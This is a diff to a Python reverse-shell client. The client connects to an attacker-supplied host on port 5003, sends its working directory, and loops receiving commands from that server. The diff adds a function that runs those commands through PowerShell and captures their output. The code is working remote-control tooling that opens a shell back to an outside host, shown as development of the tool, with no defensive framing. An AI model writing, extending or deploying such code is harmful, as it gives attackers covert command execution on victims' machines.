@@ -5,6 +5,7 @@ import sys
 
 #server info
 SERVER_HOST = sys.argv[1]
+
 SERVER_PORT = 5003
 
 #buffer size
@@ -23,11 +24,16 @@ s.connect((SERVER_HOST, SERVER_PORT))
 cwd = os.getcwd()
 s.send(cwd.encode())
 
+def run(cmd):
+    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
+    return completed
+
 # main loop
 while True:
     # receive the command from the server
     command = s.recv(BUFFER_SIZE).decode()
     splited_command = command.split()
+
     if command.lower() == "exit":
         # if the command is exit, just break out of the loop
         break
